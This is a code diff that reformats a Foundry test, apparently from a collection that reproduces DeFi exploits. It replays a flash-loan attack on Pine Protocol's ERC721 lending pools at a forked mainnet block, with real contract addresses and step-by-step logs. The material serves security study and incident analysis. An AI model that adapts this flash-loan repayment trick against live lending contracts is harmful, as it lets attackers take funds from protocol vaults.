@@ -18,18 +18,9 @@ import "./../interface.sol";
 // https://twitter.com/MistTrack_io/status/1738131780459430338
 
 interface IERC721LendingPool {
-    function flashLoan(
-        address _receiver,
-        address _reserve,
-        uint256 _amount,
-        bytes memory _params
-    ) external;
+    function flashLoan(address _receiver, address _reserve, uint256 _amount, bytes memory _params) external;
 
-    function repay(
-        uint256 nftID,
-        uint256 repayAmount,
-        address pineWallet
-    ) external returns (bool);
+    function repay(uint256 nftID, uint256 repayAmount, address pineWallet) external returns (bool);
 
     function _loans(
         uint256
@@ -50,22 +41,18 @@ interface IERC721LendingPool {
 }
 
 contract ContractTest is Test {
-    IWETH private constant WETH =
-        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
     IERC721LendingPool private constant ERC721LendingPool02Old =
         IERC721LendingPool(0x2405913d54fC46eEAF3Fb092BfB099F46803872f);
     IERC721LendingPool private constant ERC721LendingPool02New =
         IERC721LendingPool(0xC3f4659588b13f23E09Ec54783A3c407e39ad589);
-    IERC721 private constant PPG =
-        IERC721(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8);
-    address private constant pineGnosisSafe =
-        0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e;
-    address private constant pineExploiter =
-        0x05324c970713450bA0Bc12EfD840034FCB0A4BAa;
-    uint256 private constant collateralTokenId = 3_324;
+    IERC721 private constant PPG = IERC721(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8);
+    address private constant pineGnosisSafe = 0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e;
+    address private constant pineExploiter = 0x05324c970713450bA0Bc12EfD840034FCB0A4BAa;
+    uint256 private constant collateralTokenId = 3324;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 18835344);
+        vm.createSelectFork("mainnet", 18_835_344);
         vm.label(address(WETH), "WETH");
         vm.label(address(ERC721LendingPool02Old), "ERC721LendingPool02Old");
         vm.label(address(ERC721LendingPool02New), "ERC721LendingPool02New");
@@ -84,17 +71,7 @@ contract ContractTest is Test {
             "[Before loan repay] Owner of PPG NFT id 3_324 used by exploiter as loan collateral",
             PPG.ownerOf(collateralTokenId)
         );
-        (
-            ,
-            ,
-            ,
-            ,
-            uint256 borrowedWei,
-            ,
-            ,
-            ,
-            address borrower
-        ) = ERC721LendingPool02New._loans(collateralTokenId);
+        (,,,, uint256 borrowedWei,,,, address borrower) = ERC721LendingPool02New._loans(collateralTokenId);
 
         console.log(
             "[Before loan repay] Status of the exploiter's loan in the new lending pool - Borrowed wei: %s, Borrower: %s",
@@ -103,18 +80,9 @@ contract ContractTest is Test {
         );
         console.log("---Exploit start---");
         console.log("1. Taking flashloan from the old lending pool");
-        bytes memory params = abi.encode(
-            collateralTokenId,
-            address(ERC721LendingPool02New),
-            pineGnosisSafe
-        );
+        bytes memory params = abi.encode(collateralTokenId, address(ERC721LendingPool02New), pineGnosisSafe);
         vm.prank(address(this), pineExploiter);
-        ERC721LendingPool02Old.flashLoan(
-            address(this),
-            address(WETH),
-            WETH.balanceOf(pineGnosisSafe),
-            params
-        );
+        ERC721LendingPool02Old.flashLoan(address(this), address(WETH), WETH.balanceOf(pineGnosisSafe), params);
         console.log("---Exploit end---");
         emit log_named_decimal_uint(
             "[After loan repay] Vault WETH balance (nothing has changed and exploiter successfully repayed his ~4 WETH loan)",
@@ -125,9 +93,7 @@ contract ContractTest is Test {
             "[After loan repay] Owner of PPG NFT id 3_324 used by exploiter as loan collateral",
             PPG.ownerOf(collateralTokenId)
         );
-        (, , , , borrowedWei, , , , borrower) = ERC721LendingPool02New._loans(
-            collateralTokenId
-        );
+        (,,,, borrowedWei,,,, borrower) = ERC721LendingPool02New._loans(collateralTokenId);
 
         console.log(
             "[After loan repay] Status of the exploiter's loan in the new lending pool - Borrowed wei: %s, Borrower: %s",
@@ -136,27 +102,14 @@ contract ContractTest is Test {
         );
     }
 
-    function executeOperation(
-        address _reserve,
-        uint256 _amount,
-        uint256 _fee,
-        bytes memory _params
-    ) external {
+    function executeOperation(address _reserve, uint256 _amount, uint256 _fee, bytes memory _params) external {
         vm.startPrank(address(this), pineExploiter);
         WETH.approve(address(ERC721LendingPool02New), type(uint256).max);
-        console.log(
-            "2. Using flashloaned WETH amount from old lending pool to repay loan in new lending pool"
-        );
+        console.log("2. Using flashloaned WETH amount from old lending pool to repay loan in new lending pool");
         ERC721LendingPool02New.repay(collateralTokenId, _amount, address(0));
         // Exploiter send to attack contract additional 0.3 WETH to repay the flashloan in the old pool
-        deal(
-            address(WETH),
-            address(this),
-            WETH.balanceOf(address(this)) + 0.3 ether
-        );
-        console.log(
-            "3. Repaying flashloan by transferring WETH straight to the Vault"
-        );
+        deal(address(WETH), address(this), WETH.balanceOf(address(this)) + 0.3 ether);
+        console.log("3. Repaying flashloan by transferring WETH straight to the Vault");
         uint256 amountToTransfer = _amount - WETH.balanceOf(pineGnosisSafe);
         WETH.transfer(pineGnosisSafe, amountToTransfer);
         vm.stopPrank();
